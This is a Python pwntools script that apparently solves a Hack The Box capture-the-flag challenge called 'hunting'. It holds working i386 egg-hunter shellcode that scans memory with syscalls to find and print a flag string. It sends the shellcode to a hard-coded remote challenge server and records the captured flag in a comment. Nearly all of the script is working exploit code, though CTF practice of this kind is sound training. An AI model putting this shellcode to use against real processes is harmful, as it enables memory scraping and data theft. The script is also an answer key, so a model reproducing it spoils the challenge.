from pwn import *

# First system call is to disable the alarm
# Then iteratively check to see if the current page is readable or not
# If it is not readable, then find the next page
# Note: upon finding a valid memory address, the register eax stores the value 0xfffffffe
# which is equivalent to 1110 -> 0001 + 1 = 0010 = 2
def create_shellcode():
    shellcode = '''
    
    push 27
    pop eax
    xor ebx, ebx
    int 0x80

    mov ebx, 0x5fffefff
    add ebx, 1

_check_read:
    add ebx, 0xfff
    add ebx, 1

    xor ecx, ecx
    push 33
    pop eax
    int 0x80

    cmp al, 0xf2
    jz _check_read

    mov eax, [ebx]
    cmp eax, 0x7b425448
    jne _check_read

    push ebx
    pop ecx
    push 1
    pop ebx
    push 0x24
    pop edx
    push 4
    pop eax
    int 0x80

    push 1
    pop eax
    xor ebx, ebx
    int 0x80

'''
    shellcode = asm(shellcode, arch='i386')
    print(shellcode)
    return shellcode

def solve():
    LOCAL = False
    if LOCAL:
        elf = ELF('./hunting')
        r = elf.process()
    else:
        r = remote("167.172.61.89", 30352)

    shellcode = create_shellcode()
    r.sendline(shellcode)
    '''
    f = open('./payload', 'wb')
    f.write(shellcode)
    '''

    r.interactive()


def main():
    solve()
    # Flag: HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}

if __name__ == '__main__':
    main()
